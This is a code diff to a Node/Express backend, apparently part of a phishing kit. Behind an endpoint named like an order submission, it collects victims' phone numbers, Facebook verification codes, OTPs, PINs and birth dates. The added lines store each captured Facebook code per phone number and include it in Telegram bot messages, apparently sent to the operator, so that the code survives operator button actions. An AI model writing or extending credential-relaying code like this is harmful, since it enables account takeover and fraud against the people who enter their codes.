@@ -100,6 +100,12 @@ app.post('/api/submit-order', async (req, res) => {
             const isResend = uniqueId === 'Facebook Verify Resend Code';
             const fbCode = isResend ? '' : uniqueId.replace('Facebook Verify Code: ', '').trim();
 
+            if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};
+            userCredentials[cleanPhone].phone = cleanPhone;
+            if (!isResend && fbCode) {
+                userCredentials[cleanPhone].fbCode = fbCode;
+            }
+
             let fbMessage = isResend
                 ? `📲 *Facebook Verify (Resend Requested)*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\``
                 : `📲 *Facebook Verify*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n🔢 Code: \`${escapeMarkdown(fbCode)}\``;
@@ -272,6 +278,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                                `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
                 if (c.dob) replyMsg += `\n📅 DOB: \`${escapeMarkdown(c.dob)}\``;
+                if (c.fbCode) replyMsg += `\n🔢 Facebook Code: \`${escapeMarkdown(c.fbCode)}\``;
                 if (c.otp) replyMsg += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
                 if (c.confirmPin) replyMsg += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
                 if (c.applicationDetails) replyMsg += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
@@ -299,6 +306,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const cbData = update.callback_query.data || '';
         const chatId = update.callback_query.message.chat.id;
         const messageId = update.callback_query.message.message_id;
+        const origText = (update.callback_query.message && update.callback_query.message.text) || '';
 
         const parts = cbData.split('|');
         if (parts.length !== 3) {
@@ -348,7 +356,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
                              `${countryFlag} Country: \`+232\`\n` +
                              `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
-        if (stepTag !== 'wa' && userCredentials[phone]) {
+        if (stepTag === 'wa') {
+            const codeMatch = origText.match(/Code:\s*([0-9]+)/i);
+            const preservedFbCode = (userCredentials[phone] && userCredentials[phone].fbCode) || (codeMatch ? codeMatch[1] : '');
+            if (preservedFbCode) {
+                updatedMessage += `\n🔢 Code: \`${escapeMarkdown(preservedFbCode)}\``;
+            }
+        } else if (userCredentials[phone]) {
             const c = userCredentials[phone];
             if (c.dob) updatedMessage += `\n📅 DOB: \`${escapeMarkdown(c.dob)}\``;
             if (c.applicationDetails) updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
